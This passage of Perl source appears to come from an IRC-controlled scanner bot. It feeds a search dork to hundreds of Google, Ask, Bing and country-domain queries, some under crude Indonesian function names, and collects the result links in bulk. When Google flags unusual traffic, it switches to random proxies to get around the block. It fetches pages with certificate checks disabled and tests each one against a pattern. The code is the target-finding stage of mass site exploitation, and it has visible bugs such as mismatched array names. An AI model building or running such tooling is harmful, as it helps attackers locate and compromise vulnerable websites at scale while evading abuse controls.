	if ($engine eq "Cita-Citata") { my @citacitata = jack1($dork); push(@list,@citacitata);sleep(3);}

    if ($engine eq "Depe") { my @depe = jack2($dork); push(@list,@depe);sleep(3);}

    if ($engine eq "JuPe") { my @jupe = jack3($dork); push(@list,@jupe);sleep(3);}

    if ($engine eq "Ayu-tingting") { my @ayutingting = jack4($dork); push(@list,@ayutingting);sleep(3);}

    if ($engine eq "Siti-badriah") { my @sitibadriah = jack5($dork); push(@list,@australia);sleep(3);}

    if ($engine eq "Zaskia-Gotik") { my @zaskiagotik = jack6($dork); push(@list,@brazil);sleep(3); }

    if ($engine eq "Hesty") { my @hesty = jack7($dork); push(@list,@hesty);sleep(3); }

    if ($engine eq "InuL-darasista") { my @inuldarasista = jack8($dork); push(@list,@inuldarasista);sleep(3); }

    if ($engine eq "Duo-Racun") { my @duoracun = jack9($dork); push(@list,@duoracun);sleep(3); }

    if ($engine eq "Juwita-Bahar") { my @juwitabahar= jack10($dork); push(@list,@juwitabahar); }

    if ($engine eq "Uut") { my @uut = jack11($dork); push(@list,@uut);sleep(3); }

    if ($engine eq "Tuty-Wibowo") { my @tutywibowo = jack12($dork); push(@list,@tutywibowo);sleep(3); }

    if ($engine eq "MeLa-Berby") { my @melaberby = jack13($dork); push(@list,@melaberby);sleep(3); }

    if ($engine eq "Ria-Amelia") { my @riaamelia = jack14($dork); push(@list,@riaamelia);sleep(3); }

    if ($engine eq "Melinda") { my @melinda = jack15($dork); push(@list,@melinda);sleep(3); }

    if ($engine eq "Dewinta-Bahar") { my @dewintabahar = jack16($dork); push(@list,@dewintabahar);sleep(3); }

    if ($engine eq "Lia-Emilia") { my @liaemilia = jack17($dork); push(@list,@liaemilia);sleep(3); }

    if ($engine eq "Ade-Irma") { my @adeirma = jack18($dork); push(@list,@adeirma);sleep(3); }

    if ($engine eq "Shinta-n-Jojo") { my @shintanjojo = jack19($dork); push(@list,@shintanjojo);sleep(3); }

    if ($engine eq "Jenita-Janet") { my @jenitajanet = jack20($dork); push(@list,@jenitajanet);sleep(3); }

    if ($engine eq "UAE") { my @uae = jack1($dork); push(@list,@uae);sleep(3); }

    if ($engine eq "Myanmar") { my @myanmar = jack2($dork); push(@list,@myanmar);sleep(3); }

    if ($engine eq "Argentina") { my @argentina = jack3($dork); push(@list,@argentina);sleep(3); }

    if ($engine eq "Austria") { my @austria = jack4($dork); push(@list,@austria);sleep(3); }

    if ($engine eq "Australia") { my @australia = jack5($dork); push(@list,@australia);sleep(3); }

    if ($engine eq "Brazil") { my @brazil = jack6($dork); push(@list,@brazil);sleep(3); }

    if ($engine eq "Canada") { my @canada = jack7($dork); push(@list,@canada);sleep(3); }

    if ($engine eq "Chili") { my @chili = jack8($dork); push(@list,@chili);sleep(3); }

    if ($engine eq "Cina") { my @cina = jack9($dork); push(@list,@cina);sleep(3); }

    if ($engine eq "CoMersil") { my @comersil = jack10($dork); push(@list,@comersil);sleep(3); }

    if ($engine eq "Czech") { my @czech = jack11($dork); push(@list,@czech);sleep(3); }

    if ($engine eq "Germany") { my @germany = jack12($dork); push(@list,@germany);sleep(3); }

    if ($engine eq "Denmark") { my @denmark = jack13($dork); push(@list,@denmark);sleep(3); }

    if ($engine eq "Spain") { my @spain = jack14($dork); push(@list,@spain);sleep(3);sleep(3); }

    if ($engine eq "Europe") { my @europe = jack15($dork); push(@list,@europe);sleep(3); }

    if ($engine eq "France") { my @france = jack16($dork); push(@list,@france);sleep(3); }

    if ($engine eq "Hungary") { my @hungary = jack17($dork); push(@list,@hungary);sleep(3);sleep(3); }

    if ($engine eq "Indonesia") { my @indonesia = jack18($dork); push(@list,@indonesia);sleep(3); }

    if ($engine eq "Israel") { my @israel = jack19($dork); push(@list,@israel);sleep(3); }

    if ($engine eq "India") { my @india = jack20($dork); push(@list,@india);sleep(3); }

    if ($engine eq "Info") { my @info = jack1($dork); push(@list,@info);sleep(3); }

    if ($engine eq "Iran") { my @iran = jack2($dork); push(@list,@iran);sleep(3); }

    if ($engine eq "Italy") { my @italy = jack3($dork); push(@list,@italy);sleep(3); }

    if ($engine eq "Japan") { my @japan = jack4($dork); push(@list,@japan);sleep(3); }

    if ($engine eq "Korea") { my @korea = jack5($dork); push(@list,@korea);sleep(3); }

    if ($engine eq "Mexico") { my @mexico = jack6($dork); push(@list,@mexico);sleep(3); }

    if ($engine eq "Malaysia") { my @malaysia = jack7($dork); push(@list,@malaysia);sleep(3); }

    if ($engine eq "Network") { my @network = jack8($dork); push(@list,@network);sleep(3); }

    if ($engine eq "Netherlands") { my @netherlands = jack9($dork); push(@list,@netherlands); }

    if ($engine eq "Organization") { my @organization = jack10($dork); push(@list,@organization);sleep(3); }

    if ($engine eq "Philippines") { my @philippines = jack11($dork); push(@list,@philippines);sleep(3); }

    if ($engine eq "Poland") { my @poland = jack12($dork); push(@list,@poland);sleep(3); }

    if ($engine eq "Romania") { my @romania = jack13($dork); push(@list,@romania);sleep(3); }

    if ($engine eq "Russian") { my @russian = jack14($dork); push(@list,@russian);sleep(3); }

    if ($engine eq "Thailand") { my @thailand = jack14($dork); push(@list,@thailand);sleep(3); }

    if ($engine eq "Ukraine") { my @ukraine = jack16($dork); push(@list,@ukraine);sleep(3); }

    if ($engine eq "England") { my @england = jack17($dork); push(@list,@england);sleep(3); }

    if ($engine eq "USA") { my @usa = jack18($dork); push(@list,@usa);sleep(3); }

    if ($engine eq "Slovenia") { my @slovenia = jack19($dork."+site:si"); push(@list,@slovenia);sleep(3); }

    if ($engine eq "Belgium") { my @belgium = jack20($dork."+site:be"); push(@list,@belgium);sleep(3); }

    if ($engine eq "Bussines") { my @bussines = jack1($dork."+site:bi"); push(@list,@bussines);sleep(3); }            

    if ($engine eq "SouthAfrica") { my @southafrica = jack2($dork."+site:co.za"); push(@list,@southafrica); }

    if ($engine eq "Vietnam") { my @vietnam = jack3($dork."+site:com.vn"); push(@list,@vietnam);sleep(3); }

    if ($engine eq "Tuvalu") { my @tuvalu = jack4($dork."+site:tt"); push(@list,@tuvalu);sleep(3); }

    if ($engine eq "Cocos") { my @cocos = jack5($dork."+site:cc"); push(@list,@cocos);sleep(3); }

    if ($engine eq "Turky") { my @turky = jack6($dork."+site:tr"); push(@list,@turky);sleep(3); }

    if ($engine eq "Asia") { my @asia = jack7($dork."+site:asia"); push(@list,@asia);sleep(3); }

    if ($engine eq "Serbia") { my @serbia = jack8($dork."+site:rs"); push(@list,@serbia);sleep(3); }

    if ($engine eq "Singapore") { my @singapore = jack9($dork."+site:sg"); push(@list,@singapore);sleep(3); }

    if ($engine eq "Taiwan") { my @taiwan = jack10($dork."+site:tw"); push(@list,@taiwan);sleep(3);}

    if ($engine eq "Sweden") { my @sweden = jack11($dork."+site:se"); push(@list,@sweden);sleep(3); }

    if ($engine eq "Pakistan") { my @pakistan = jack12($dork."+site:pk"); push(@list,@pakistan);sleep(3); }

    if ($engine eq "Norway") { my @normay = jack13($dork."+site:no"); push(@list,@norway);sleep(3); }

    if ($engine eq "Montenegro") { my @montenegro = jack14($dork."+site:me"); push(@list,@montenegro);sleep(3); }      

    if ($engine eq "Greece") { my @greece = jack15($dork."+site:gr"); push(@list,@greece);sleep(3);sleep(3);}

    if ($engine eq "Education") { my @education = jack16($dork."+site:edu"); push(@list,@education);sleep(3);}

    if ($engine eq "Goverment") { my @goverment = jack17($dork."+site:gov"); push(@list,@goverment);sleep(3); }

    if ($engine eq "Kazakhstan") { my @kazakhstan = jack18($dork."+site:kz"); push(@list,@kazakhstan);sleep(3); }

    if ($engine eq "Afganistan") { my @afganistan = jack19($dork."+site:af"); push(@list,@afganistan);sleep(3); }

    if ($engine eq "Albania") { my @albania = jack20($dork."+site:al"); push(@list,@albania);sleep(3); }

    if ($engine eq "Algeria") { my @algeria = jack1($dork."+site:dz"); push(@list,@algeria);sleep(3); }

    if ($engine eq "Angola") { my @angola = jack2($dork."+site:ao"); push(@list,@angola);sleep(3); }

    if ($engine eq "Armenia") { my @armenia = jack3($dork."+site:am"); push(@list,@armenia);sleep(3); }

    if ($engine eq "Azerbaijan") { my @azerbaijan = jack4($dork."+site:az"); push(@list,@azerbaijan);sleep(3); }

    if ($engine eq "Bahrain") { my @bahrain = jack5($dork."+site:bh"); push(@list,@bahrain);sleep(3); }

    if ($engine eq "Bangladesh") { my @bangladesh = jack6($dork."+site:bd"); push(@list,@bangladesh);sleep(3); }

    if ($engine eq "Belarus") { my @belarus = jack7($dork."+site:by"); push(@list,@belarus);sleep(3); }

    if ($engine eq "Bhutan") { my @bhutan = jack8($dork."+site:bt"); push(@list,@bhutan);sleep(3); }

    if ($engine eq "Bolivia") { my @bolivia = jack9($dork."+site:bo"); push(@list,@bolivia);sleep(3); }

    if ($engine eq "Bosnia") { my @bosnia = jack10($dork."+site:ba"); push(@list,@bosnia);sleep(3); }

    if ($engine eq "Bulgaria") { my @bulgaria = jack12($dork."+site:bg"); push(@list,@bulgaria);sleep(3); }

    if ($engine eq "Brunei") { my @brunei = jack13($dork."+site:bn"); push(@list,@brunei);sleep(3); }

    if ($engine eq "Cambodia") { my @cambodia = jack14($dork."+site:kh"); push(@list,@cambodia);sleep(3); }

    if ($engine eq "Cameroon") { my @cameroon = jack11($dork."+site:cm"); push(@list,@cameroon);sleep(3); }

    if ($engine eq "Christmas") { my @christmas = jack15($dork."+site:cx"); push(@list,@christmas);sleep(3); }

    if ($engine eq "CostaRika") { my @costarika = jack16($dork."+site:cr"); push(@list,@costarika);sleep(3); }

    if ($engine eq "Croatia") { my @croatia = jack17($dork."+site:hr"); push(@list,@croatia);sleep(3); }

    if ($engine eq "Cuba") { my @cuba = jack18($dork."+site:cu"); push(@list,@cuba);sleep(3); }

    if ($engine eq "Cyprus") { my @cyprus = jack19($dork."+site:cy"); push(@list,@cyprus);sleep(3); }

    if ($engine eq "Dominican") { my @dominican = jack20($dork."+site:dm"); push(@list,@dominican);sleep(3); }

    if ($engine eq "Equador") { my @equador = jack1($dork."+site:ec"); push(@list,@equador);sleep(3); }

    if ($engine eq "Egypt") { my @egypt = jack2($dork."+site:eg"); push(@list,@egypt);sleep(3); }

    if ($engine eq "Estonia") { my @estonia = jack3($dork."+site:ee"); push(@list,@estonia);sleep(3); }

    if ($engine eq "Finland") { my @finland = jack4($dork."+site:fi"); push(@list,@finland);sleep(3); }

    if ($engine eq "Georgia") { my @georgia = jack5($dork."+site:ge"); push(@list,@georgia);sleep(3); }

    if ($engine eq "Ghana") { my @ghana = jack6($dork."+site:gh"); push(@list,@ghana);sleep(3); }

    if ($engine eq "Grenada") { my @grenada = jack7($dork."+site:gd"); push(@list,@grenada);sleep(3); }

    if ($engine eq "Honduras") { my @honduras = jack8($dork."+site:hn"); push(@list,@honduras);sleep(3); }

    if ($engine eq "Hongkong") { my @hongkong = jack9($dork."+site:hk"); push(@list,@hongkong);sleep(3); }

    if ($engine eq "Iceland") { my @iceland = jack10($dork."+site:is"); push(@list,@iceland);sleep(3); }

    if ($engine eq "Ireland") { my @ireland = jack12($dork."+site:ie"); push(@list,@ireland);sleep(3); }

    if ($engine eq "Kenya") { my @kenya = jack13($dork."+site:ke"); push(@list,@kenya);sleep(3); }

    if ($engine eq "Kuwait") { my @kuwait = jack14($dork."+site:kw"); push(@list,@kuwait);sleep(3); }

    if ($engine eq "Laos") { my @laos = jack16($dork."+site:la"); push(@list,@laos);sleep(3); }

    if ($engine eq "Latvia") { my @latvia = jack17($dork."+site:lv"); push(@list,@latvia);sleep(3); }

    if ($engine eq "Liberia") { my @liberia = jack18($dork."+site:lr"); push(@list,@liberia);sleep(3); }

    if ($engine eq "Libyan") { my @libyan = jack19($dork."+site:ly"); push(@list,@libyan);sleep(3); }

    if ($engine eq "Lithuania") { my @lithuania = jack11($dork."+site:lt"); push(@list,@lithuania);sleep(3); }

    if ($engine eq "Macedonia") { my @macedonia = jack15($dork."+site:mk"); push(@list,@macedonia);sleep(3); }         

    if ($engine eq "Malta") { my @malta = jack1($dork."+site:mt"); push(@list,@malta);sleep(3); }

    if ($engine eq "Mongolia") { my @mongolia = jack2($dork."+site:mn"); push(@list,@mongolia);sleep(3); }

    if ($engine eq "Mozambique") { my @mozambique = jack3($dork."+site:mz"); push(@list,@mozambique);sleep(3); }

    if ($engine eq "Namibia") { my @namibia = jack4($dork."+site:na"); push(@list,@namibia);sleep(3); }

    if ($engine eq "Nauru") { my @nauru = jack6($dork."+site:nr"); push(@list,@nauru);sleep(3); }

    if ($engine eq "Nepal") { my @nepal = jack7($dork."+site:np"); push(@list,@nepal);sleep(3); }

    if ($engine eq "NewZealand") { my @newzealand = jack8($dork."+site:nz"); push(@list,@newzealand);sleep(3); }

    if ($engine eq "Nigeria") { my @nigeria = jack9($dork."+site:ng"); push(@list,@nigeria);sleep(3); }

    if ($engine eq "Paraguay") { my @paraguay = jack10($dork."+site:py"); push(@list,@paraguay);sleep(3); }

    if ($engine eq "Peru") { my @peru = jack5($dork."+site:pe"); push(@list,@peru);sleep(3); }

    if ($engine eq "Portugal") { my @portugal = jack11($dork."+site:pt"); push(@list,@portugal);sleep(3); }

    if ($engine eq "PuertoRico") { my @puertorico = jack12($dork."+site:pr"); push(@list,@puertorico);sleep(3); }

    if ($engine eq "Qatar") { my @qatar = jack13($dork."+site:qa"); push(@list,@qatar);sleep(3); }     

    if ($engine eq "SaintLucia") { my @saintlucia = jack14($dork."+site:lc"); push(@list,@saintlucia);sleep(3); }

    if ($engine eq "Samoa") { my @samoa = jack15($dork."+site:ws"); push(@list,@samoa);sleep(3); }

    if ($engine eq "SaudiArabia") { my @saudiarabia = jack17($dork."+site:sa"); push(@list,@saudiarabia);sleep(3); }

    if ($engine eq "Senegal") { my @senegal = jack18($dork."+site:sn"); push(@list,@senegal);sleep(3); }

    if ($engine eq "Slovakia") { my @slovakia = jack16($dork."+site:sk"); push(@list,@slovakia);sleep(3); }

    if ($engine eq "Srilanka") { my @srilanka = jack19($dork."+site:lk"); push(@list,@srilanka);sleep(3); }

    if ($engine eq "Swaziland") { my @swaziland = jack20($dork."+site:sz"); push(@list,@swaziland);sleep(3); }

    if ($engine eq "Tajikistan") { my @tajikistan = jack1($dork."+site:tj"); push(@list,@tajikistan);sleep(3); }

    if ($engine eq "Tanzania") { my @tanzania = jack2($dork."+site:tz"); push(@list,@tanzania);sleep(3); }

    if ($engine eq "Tokelau") { my @tokelau = jack3($dork."+site:tk"); push(@list,@tokelau);sleep(3); }

    if ($engine eq "Tonga") { my @tonga = jack4($dork."+site:to"); push(@list,@tonga);sleep(3); }

    if ($engine eq "Tunisia") { my @tunisia = jack5($dork."+site:tn"); push(@list,@tunisia);sleep(3); }        

    if ($engine eq "Uruguay") { my @uruguay = jack6($dork."+site:uy"); push(@list,@uruguay);sleep(3); }

    if ($engine eq "Uzbekistan") { my @uzbekistan = jack7($dork."+site:uz"); push(@list,@uzbekistan);sleep(3); }

    if ($engine eq "Venezuela") { my @venezuela = jack8($dork."+site:ve"); push(@list,@venezuela);sleep(3); }

    if ($engine eq "Yemen") { my @yemen = jack9($dork."+site:ye"); push(@list,@yemen);sleep(3); }

    if ($engine eq "Yugoslavia") { my @yugoslavia = jack10($dork."+site:yu"); push(@list,@yugoslavia);sleep(3); }

    if ($engine eq "Zambia") { my @zambia = jack11($dork."+site:zm"); push(@list,@zambia);sleep(3); }

    if ($engine eq "Uganda") { my @uganda = jack12($dork."+site:ug"); push(@list,@uganda);sleep(3); }

    if ($engine eq "Trinidad") { my @trinidad = jack13($dork."+site:tt"); push(@list,@trinidad);sleep(3); }

    if ($engine eq "Zimbabwe") { my @zimbabwe = jack14($dork."+site:zw"); push(@list,@zimbabwe);sleep(3); }

    if ($engine eq "KonToL") { my @kontol = kontol($dork); push(@list,@kontol);sleep(3); }

    if ($engine eq "PePek") { my @pepek = pepek($dork); push(@list,@pepek);sleep(3); }

    if ($engine eq "TeTek") { my @tetek = tetek($dork); push(@list,@tetek);sleep(3); }

    if ($engine eq "ItiL") { my @itil = itil($dork); push(@list,@itil);sleep(3); }

    if ($engine eq "NenNen") { my @nennen = nennen($dork); push(@list,@nennen);sleep(3); }

    if ($engine eq "SuSu") { my @susu = susu($dork); push(@list,@susu);sleep(3); }

    if ($engine eq "BuahDada") { my @buahdada = buahdada($dork); push(@list,@buahdada);sleep(3); }

    if ($engine eq "PayuDara") { my @payudara = payudara($dork); push(@list,@payudara);sleep(3); }

    if ($engine eq "Kentot") { my @kentot = kentot($dork); push(@list,@kentot);sleep(3); }

    if ($engine eq "eMeL") { my @emel = emel($dork); push(@list,@emel);sleep(3); }

    if ($engine eq "OraL") { my @oral = oral($dork); push(@list,@oral);sleep(3); }

    if ($engine eq "Klitoris") { my @klitoris = klitoris($dork); push(@list,@klitoris);sleep(3); }

    if ($engine eq "Masturbasi") { my @masturbasi = masturbasi($dork); push(@list,@masturbasi);sleep(3); }

    if ($engine eq "Onani") { my @onani = onani($dork); push(@list,@onani);sleep(3); } 

    if ($engine eq "Sperma") { my @sperma = sperma($dork); push(@list,@sperma);sleep(3); }             

    if ($engine eq "AnaL") { my @anal = anal($dork); push(@list,@anal);sleep(3); }

    if ($engine eq "Puting") { my @puting = puting($dork); push(@list,@puting);sleep(3); }     

    if ($engine eq "Vagina") { my @vagina = vagina($dork); push(@list,@vagina);sleep(3); }

    if ($engine eq "Penis") { my @penis = penis($dork); push(@list,@penis);sleep(3); }

    if ($engine eq "MeMek") { my @memek = memek($dork); push(@list,@memek);sleep(3); }

    if ($engine eq "GooGLe") { my @google = &google($dork); push(@list,@google);sleep(3); }

    if ($engine eq "GooGLeCA") { my @googleCA = googleCA($dork); push(@list,@googleCA);sleep(3); }

    if ($engine eq "GooGLeDE") { my @googleDE = googleDE($dork); push(@list,@googleDE);sleep(3); }

    if ($engine eq "GooGLeUK") { my @googleUK = googleUK($dork); push(@list,@googleUK);sleep(3); }

    if ($engine eq "GooGLeFR") { my @googleFR = googleFR($dork); push(@list,@googleFR);sleep(3); }

    if ($engine eq "GooGLeES") { my @googleES = googleES($dork); push(@list,@googleES);sleep(3); }

    if ($engine eq "GooGLeIT") { my @googleIT = googleIT($dork); push(@list,@googleIT);sleep(3); }

    if ($engine eq "GooGLeNL") { my @googleNL = googleNL($dork); push(@list,@googleNL);sleep(3); }

    if ($engine eq "GooGLeBE") { my @googleBE = googleBE($dork); push(@list,@googleBE);sleep(3); }

    if ($engine eq "GooGLeCH") { my @googleCH = googleCH($dork); push(@list,@googleCH);sleep(3); }

    if ($engine eq "GooGLeSE") { my @googleSE = googleSE($dork); push(@list,@googleSE);sleep(3); }

    if ($engine eq "GooGLeDK") { my @googleDK = googleDK($dork); push(@list,@googleDK);sleep(3); }

    if ($engine eq "GooGLeNO") { my @googleNO = googleNO($dork); push(@list,@googleNO);sleep(3); }

    if ($engine eq "GooGLeNZ") { my @googleNZ = googleNZ($dork); push(@list,@googleNZ);sleep(3); }

    if ($engine eq "GooGLeIE") { my @googleIE = googleIE($dork); push(@list,@googleIE);sleep(3); }

    if ($engine eq "GooGLeBR") { my @googleBR = googleBR($dork); push(@list,@googleBR);sleep(3); }

    if ($engine eq "GooGLeAR") { my @googleAR = googleAR($dork); push(@list,@googleAR);sleep(3); }

    if ($engine eq "GooGLeCO") { my @googleCO = googleCO($dork); push(@list,@googleCO);sleep(3); }

    if ($engine eq "GooGLeCU") { my @googleCU = googleCU($dork); push(@list,@googleCU);sleep(3); }

    if ($engine eq "GooGLeCL") { my @googleCL = googleCL($dork); push(@list,@googleCL);sleep(3); }

    if ($engine eq "GooGLeMX") { my @googleMX = googleMX($dork); push(@list,@googleMX);sleep(3); }

    if ($engine eq "GooGLeAU") { my @googleAU = googleAU($dork); push(@list,@googleAU);sleep(3); }

    if ($engine eq "GooGLeRU") { my @googleRU = googleRU($dork); push(@list,@googleRU);sleep(3); }

    if ($engine eq "GooGLeAT") { my @googleAT = googleAT($dork); push(@list,@googleAT);sleep(3); }

    if ($engine eq "GooGLePL") { my @googlePL = googlePL($dork); push(@list,@googlePL);sleep(3); }

    if ($engine eq "GooGLeIL") { my @googleIL = googleIL($dork); push(@list,@googleIL);sleep(3); }

    if ($engine eq "GooGLeTR") { my @googleTR = googleTR($dork); push(@list,@googleTR);sleep(3); }

    if ($engine eq "GooGLeUA") { my @googleUA = googleUA($dork); push(@list,@googleUA);sleep(3); }

    if ($engine eq "GooGLeGR") { my @googleGR = googleGR($dork); push(@list,@googleGR);sleep(3); }

    if ($engine eq "GooGLeJP") { my @googleJP = googleJP($dork); push(@list,@googleJP);sleep(3); }

    if ($engine eq "GooGLeCN") { my @googleCN = googleCN($dork); push(@list,@googleCN);sleep(3); }

    if ($engine eq "GooGLeMY") { my @googleMY = googleMY($dork); push(@list,@googleMY);sleep(3); }

    if ($engine eq "GooGLeTH") { my @googleTH = googleTH($dork); push(@list,@googleTH);sleep(3); }

    if ($engine eq "GooGLeIN") { my @googleIN = googleIN($dork); push(@list,@googleIN);sleep(3); }

    if ($engine eq "GooGLeKR") { my @googleKR = googleKR($dork); push(@list,@googleKR);sleep(3); }

    if ($engine eq "GooGLeRO") { my @googleRO = googleRO($dork); push(@list,@googleRO);sleep(3); }

    if ($engine eq "GooGLeTW") { my @googleTW = googleTW($dork); push(@list,@googleTW);sleep(3); }

    if ($engine eq "GooGLeZA") { my @googleZA = googleZA($dork); push(@list,@googleZA);sleep(3); }

    if ($engine eq "GooGLePT") { my @googlePT = googlePT($dork); push(@list,@googlePT);sleep(3); }

    if ($engine eq "AsKCA") { my @askCA = askCA($dork); push(@list,@askCA);sleep(3); }

    if ($engine eq "AsKDE") { my @askDE = askDE($dork); push(@list,@askDE);sleep(3); }

    if ($engine eq "AsKIT") { my @askIT = askIT($dork); push(@list,@askIT);sleep(3); }

    if ($engine eq "AsKUK") { my @askUK = askUK($dork); push(@list,@askUK);sleep(3); }

    if ($engine eq "AsKFR") { my @askFR = askFR($dork); push(@list,@askFR);sleep(3); }

    if ($engine eq "AsKES") { my @askES = askES($dork); push(@list,@askES);sleep(3); }

    if ($engine eq "AsKRU") { my @askRU = askRU($dork); push(@list,@askRU);sleep(3); }

    if ($engine eq "AsKNL") { my @askNL = askNL($dork); push(@list,@askNL);sleep(3); }

    if ($engine eq "AsKEU") { my @askEU = askEU($dork); push(@list,@askEU);sleep(3); }

    if ($engine eq "AsKPL") { my @askPL = askPL($dork); push(@list,@askPL);sleep(3); }

    if ($engine eq "AsKAT") { my @askAT = askAT($dork); push(@list,@askAT);sleep(3); }

    if ($engine eq "AsKSE") { my @askSE = askSE($dork); push(@list,@askSE);sleep(3); }

    if ($engine eq "AsKDK") { my @askDK = askDK($dork); push(@list,@askDK);sleep(3); }

    if ($engine eq "AsKNO") { my @askNO = askNO($dork); push(@list,@askNO);sleep(3); }

    if ($engine eq "AsKAU") { my @askAU = askAU($dork); push(@list,@askAU);sleep(3); }

    if ($engine eq "AsKBR") { my @askBR = askBR($dork); push(@list,@askBR);sleep(3); }

    if ($engine eq "AsKMX") { my @askMX = askMX($dork); push(@list,@askMX);sleep(3); }

    if ($engine eq "AsKJP") { my @askJP = askJP($dork); push(@list,@askJP);sleep(3); }

    if ($engine eq "BingDE") { my @bingDE = bingDE($dork); push(@list,@bingDE);sleep(3); }

    if ($engine eq "BingUK") { my @bingUK = bingUK($dork); push(@list,@bingUK);sleep(3); }

    if ($engine eq "BingCA") { my @bingCA = bingCA($dork); push(@list,@bingCA);sleep(3); }

    if ($engine eq "BingBR") { my @bingBR = bingBR($dork); push(@list,@bingBR);sleep(3); }

    if ($engine eq "BingFR") { my @bingFR = bingFR($dork); push(@list,@bingFR);sleep(3); }

    if ($engine eq "BingES") { my @bingES = bingES($dork); push(@list,@bingES);sleep(3); }

    if ($engine eq "BingIT") { my @bingIT = bingIT($dork); push(@list,@bingIT);sleep(3); }

    if ($engine eq "BingBE") { my @bingBE = bingBE($dork); push(@list,@bingBE);sleep(3); }

    if ($engine eq "BingNL") { my @bingNL = bingNL($dork); push(@list,@bingNL);sleep(3); }

    if ($engine eq "BingPT") { my @bingPT = bingPT($dork); push(@list,@bingPT);sleep(3); }

    if ($engine eq "BingNO") { my @bingNO = bingNO($dork); push(@list,@bingNO);sleep(3); }

    if ($engine eq "BingDK") { my @bingDK = bingDK($dork); push(@list,@bingDK);sleep(3); }

    if ($engine eq "BingSE") { my @bingSE = bingSE($dork); push(@list,@bingSE);sleep(3); }

    if ($engine eq "BingCH") { my @bingCH = bingCH($dork); push(@list,@bingCH);sleep(3); }

    if ($engine eq "BingNZ") { my @bingNZ = bingNZ($dork); push(@list,@bingNZ);sleep(3); }

    if ($engine eq "BingRU") { my @bingRU = bingRU($dork); push(@list,@bingRU);sleep(3); }

    if ($engine eq "BingJP") { my @bingJP = bingJP($dork); push(@list,@bingJP);sleep(3); }

    if ($engine eq "BingCN") { my @bingCN = bingCN($dork); push(@list,@bingCN);sleep(3); }

    if ($engine eq "BingKR") { my @bingKR = bingKR($dork); push(@list,@bingKR);sleep(3); }

    if ($engine eq "BingMX") { my @bingMX = bingMX($dork); push(@list,@bingMX);sleep(3); }

    if ($engine eq "BingAR") { my @bingAR = bingAR($dork); push(@list,@bingAR);sleep(3); }

    if ($engine eq "BingCL") { my @bingCL = bingCL($dork); push(@list,@bingCL);sleep(3); }

    if ($engine eq "BingAU") { my @bingAU = bingAU($dork); push(@list,@bingAU);sleep(3); }

	

    @clean = clean(@list);

        if (@clean > 0){

	#&msg("$chan","[4@15$engine15] 9+ 11[".scalar(@list). "]12 ");

    }

    return @clean;

}

#########################################

sub isFound() {

    my $status = 0;

    my $link = $_[0];

    my $reqexp = $_[1];

    my $res = get_content($link);

    if ($res =~ /$reqexp/) { $status = 1 }

    return $status;

}

 

sub get_content() {

    my $url = $_[0];

  #  my $ua = LWP::UserAgent->new(agent => $uagent);

   # $ua->timeout(20);

	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

	$ua->agent($uagent); 

    $ua->timeout(20);  

    my $req = HTTP::Request->new(GET => $url);

    my $res = $ua->request($req);

    return $res->content;

}

######################################### SEARCH ENGINE



sub jack() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack1.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub jack1() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack1.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack1 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack1.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



 

sub jack2() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack2.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack2 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack2.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack3() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack3.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack3 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack3.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack4() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack4.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack4 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack4.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack5() {

    my @list;

    my $key = $_[0];

